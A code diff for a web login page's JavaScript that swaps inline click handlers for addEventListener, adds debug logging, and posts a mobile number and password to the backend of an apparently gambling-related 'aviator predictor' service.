@@ -341,7 +341,7 @@
             <a href="#">Forgot Password?</a>
         </div>
 
-        <button class="login-btn" onclick="doLogin()">
+        <button class="login-btn" id="loginBtn">
             <span class="spinner" id="spinner"></span>
             <span class="btn-text" id="btnText">Login</span>
         </button>
@@ -351,52 +351,67 @@
         </div>
 
         <p class="signup-text">
-            <a onclick="goToSignup()">Sign Up</a>
+            <a id="signupLink">Sign Up</a>
         </p>
 
     </div>
 
     <script>
         // ============================================
-        // LOGIN PAGE - WORKING
+        // LOGIN PAGE - FIXED WITH addEventListener
         // ============================================
 
+        // Get all elements
         var mobileInput = document.getElementById('mobileNumber');
         var passwordInput = document.getElementById('password');
+        var loginBtn = document.getElementById('loginBtn');
         var spinner = document.getElementById('spinner');
         var btnText = document.getElementById('btnText');
         var messageDiv = document.getElementById('message');
         var loadingOverlay = document.getElementById('loadingOverlay');
-        var loginBtn = document.querySelector('.login-btn');
+        var signupLink = document.getElementById('signupLink');
 
+        // Show message
         function showMessage(text, type) {
             messageDiv.textContent = text;
             messageDiv.className = type;
         }
 
+        // Hide message
         function hideMessage() {
             messageDiv.textContent = '';
             messageDiv.className = '';
         }
 
+        // Show loading
         function showLoading() {
             loginBtn.disabled = true;
             spinner.classList.add('active');
             btnText.textContent = 'Logging in...';
             loadingOverlay.classList.add('active');
+            console.log('⏳ Loading started');
         }
 
+        // Hide loading
         function hideLoading() {
             loginBtn.disabled = false;
             spinner.classList.remove('active');
             btnText.textContent = 'Login';
             loadingOverlay.classList.remove('active');
+            console.log('✅ Loading stopped');
         }
 
+        // ===== MAIN LOGIN FUNCTION =====
         function doLogin() {
+            console.log('🖱️ Login button clicked!');
+            
             var mobileNumber = mobileInput.value.trim();
             var password = passwordInput.value.trim();
 
+            console.log('📱 Mobile:', mobileNumber);
+            console.log('🔒 Password:', password ? '******' : 'empty');
+
+            // Validate
             if (!mobileNumber || !password) {
                 showMessage('⚠️ Please enter both mobile number and password.', 'error');
                 return;
@@ -412,6 +427,7 @@
             showLoading();
 
             var apiUrl = 'https://betwayaviatorpredictor-production-911a.up.railway.app/api/login';
+            console.log('📤 Sending to:', apiUrl);
 
             fetch(apiUrl, {
                 method: 'POST',
@@ -422,9 +438,11 @@
                 })
             })
             .then(function(response) {
+                console.log('📡 Response status:', response.status);
                 return response.json();
             })
             .then(function(data) {
+                console.log('📦 Response data:', data);
                 hideLoading();
                 if (data.success) {
                     showMessage('✅ Login successful! Redirecting...', 'success');
@@ -437,23 +455,34 @@
                 }
             })
             .catch(function(error) {
+                console.error('❌ ERROR:', error);
                 hideLoading();
                 showMessage('❌ Error: ' + error.message, 'error');
             });
         }
 
+        // ===== GO TO SIGNUP =====
         function goToSignup() {
+            console.log('🔄 Going to signup page...');
             window.location.href = 'signup.html';
         }
 
-        document.onkeypress = function(e) {
+        // ===== ATTACH EVENT LISTENERS =====
+        loginBtn.addEventListener('click', doLogin);
+        signupLink.addEventListener('click', goToSignup);
+
+        // ===== ENTER KEY SUPPORT =====
+        document.addEventListener('keypress', function(e) {
             if (e.key === 'Enter') {
                 var active = document.activeElement;
                 if (active === mobileInput || active === passwordInput) {
                     doLogin();
                 }
             }
-        };
+        });
+
+        console.log('✅ All systems ready!');
+        console.log('✅ Waiting for user to tap Login...');
     </script>
 
 </body>
